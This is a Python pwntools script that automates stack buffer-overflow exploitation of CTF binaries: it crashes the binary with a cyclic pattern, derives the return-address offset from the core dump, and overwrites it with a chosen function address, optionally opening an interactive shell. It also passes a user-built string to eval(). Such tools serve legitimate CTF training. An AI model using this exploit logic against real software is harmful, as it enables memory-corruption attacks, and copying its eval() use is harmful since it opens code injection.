from pwn import *
import sys
import subprocess
import pyperclip
import argparse
from termcolor import colored

context.log_level = "error"


## BANNER ##

def print_banner(title=""):
    subprocess.call("clear")
    print(colored ("""
    ____                 ________  __________            __
   / __ \_      ______  / ____/ /_/ __/_  __/___  ____  / /
  / /_/ / | /| / / __ \/ /   / __/ /_  / / / __ \/ __ \/ / 
 / ____/| |/ |/ / / / / /___/ /_/ __/ / / / /_/ / /_/ / /  
/_/     |__/|__/_/ /_/\____/\__/_/   /_/  \____/\____/_/   
                                                           

                By: DiegoAltF4 and Dbd4
""",'red'))
    total_len = 62
    if title:
        padding = total_len - len(title) - 4
        print("== {} {}\n".format(title, "=" * padding))
    else:
        print("{}\n".format("=" * total_len))



## MAIN PROGRAM ## 

if __name__ == "__main__":

    print_banner()

    parser = argparse.ArgumentParser(description="Auto PWN tool for CTF")
    parser.add_argument('-vv', action="store_true", dest="MoreVerbose", required=False, help="Max Verbose (debug)")
    parser.add_argument('-v', action="store_true", dest="Verbose", required=False, help="Verbose (info)")
    parser.add_argument('-g', action="store_true", dest="GdbDebug", required=False, help="Attach GDB")
    parser.add_argument('-f', action="store", dest="File", required=True, help="File to PWN")
    parser.add_argument('-t', action="store", dest="Target", required=True, help="Target Function")
    parser.add_argument('--offset', action="store_true", dest="offset", required=False, help="Print offset Instruction Pointer")
    parser.add_argument('--shell', action="store_true", dest="Shell", required=False, help="Stay interactive")

    results = parser.parse_args()
    File = context.binary = results.File
    Target = results.Target
    elf = ELF(File)

    if (results.Verbose):
        context.log_level = "info"
    if (results.MoreVerbose):
        context.log_level = "debug"

    Target = "elf.symbols.Target".replace("Target",Target)


    # Generate a cyclic pattern so that we can auto-find the offset
    payload = cyclic(1000)

    # Run the process once so that it crashes
    io=process(File)
    io.sendline(payload)
    io.wait()

    # Get the core dump
    core = Coredump('./core')

    # Our cyclic pattern should have been used as the crashing address

    if elf.elfclass==32:
        assert pack(core.eip) in payload
        offset=cyclic_find(core.eip)
    else:
        assert core.read(core.rsp,4) in payload
        offset=cyclic_find(core.read(core.rsp,4))

    if results.offset:
        print("Offset: {}".format(offset))

    payload = flat({
        offset: eval(Target)
    })

    
    io = process(File)
    if results.GdbDebug:
        gdb.attach(io)
    io.send(payload)
    if results.Shell:
        io.interactive()
    else:   
        io.sendline(b"\n")
        print("\n[*] Possible flag:")
        print(colored ("\t{}\n".format(io.recv()), "green"))